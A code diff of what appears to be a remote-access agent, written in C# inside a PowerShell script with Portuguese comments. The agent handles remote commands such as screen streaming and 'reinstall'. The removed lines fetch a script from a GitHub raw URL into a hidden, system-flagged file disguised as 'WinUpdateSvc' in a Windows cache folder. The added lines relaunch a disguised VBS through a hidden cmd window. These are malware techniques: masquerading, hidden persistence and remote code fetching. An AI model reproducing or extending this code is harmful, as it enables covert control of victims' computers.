@@ -204,26 +204,18 @@ if (-not ("R9KAgent" -as [type])) {
                 if (cmd == "stream_start") { streaming = true; return; }
                 if (cmd == "stream_stop") { streaming = false; lock(writeLock) { myWriter.WriteLine("STREAM_STOPPED"); } return; }
                 
-                // COMANDO DE REINSTALAR (FORÇA O DOWNLOAD DA VERSAO NOVA)
+                // COMANDO DE REINSTALAR (COM DELAY PARA NÃO TRAVAR O ARQUIVO)
                 if (cmd == "reinstall") {
-                    string scriptPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches\WinUpdateSvc.ps1";
                     string vbsPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches\WinUpdateSvc.vbs";
-                    string url = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1";
-                    
                     try {
-                        // Baixa a versão nova forçadamente
-                        using (WebClient wc = new WebClient()) {
-                            wc.Headers.Add("User-Agent", "Mozilla/5.0");
-                            wc.DownloadFile(url, scriptPath);
-                        }
-                        File.SetAttributes(scriptPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
-                        
-                        // Inicia o novo
-                        if (File.Exists(vbsPath)) {
-                            Process.Start("wscript.exe", "//B //Nologo \"" + vbsPath + "\"");
-                        }
+                        // Cria um processo no CMD que espera 2 segundos (garantindo que esse processo morra e libere o arquivo)
+                        // e depois abre o VBS novamente
+                        ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c timeout /t 2 /nobreak >nul && wscript.exe //B //Nologo \"" + vbsPath + "\"");
+                        psi.WindowStyle = ProcessWindowStyle.Hidden;
+                        psi.CreateNoWindow = true;
+                        Process.Start(psi);
                     } catch {}
-                    Environment.Exit(0); // Fecha o antigo
+                    Environment.Exit(0); // Fecha o processo atual
                 }
 
                 if (cmd == "banner_on") {
